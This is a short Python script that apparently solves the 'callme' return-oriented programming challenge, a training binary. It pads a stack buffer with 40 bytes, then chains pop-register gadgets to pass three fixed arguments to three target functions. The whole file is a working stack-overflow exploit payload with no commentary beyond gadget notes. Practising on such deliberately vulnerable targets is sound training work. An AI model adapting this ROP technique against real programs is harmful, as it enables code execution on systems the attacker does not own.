import sys
import struct 

callme_one = 0x0000000000400720
callme_two = 0x0000000000400740
callme_three = 0x00000000004006f0

argument_one = 0xdeadbeefdeadbeef
argument_two = 0xcafebabecafebabe
argument_three = 0xd00df00dd00df00d
argument_dummy = 0xaaaaaaaaaaaaaaaa

gadget1 = 0x00000000004009a3 # --> pop rdi; ret;
gadget2 = 0x00000000004009a1 # --> pop rsi; pop r15; ret; REMEMBER A DUMMY ARGUMENT !!
gadget3 = 0x000000000040093e # --> pop rdx; ret;

prepare_arguments = struct.pack("Q", gadget1) + struct.pack("Q", argument_one)
prepare_arguments += struct.pack("Q", gadget2) + struct.pack("Q", argument_two) + struct.pack("Q", argument_dummy)
prepare_arguments += struct.pack("Q", gadget3) +  struct.pack("Q", argument_three)

buf = b"A"*40 

buf += prepare_arguments
buf += struct.pack("Q", callme_one)

buf += prepare_arguments
buf += struct.pack("Q", callme_two)

buf += prepare_arguments
buf += struct.pack("Q", callme_three)

sys.stdout.buffer.write(buf)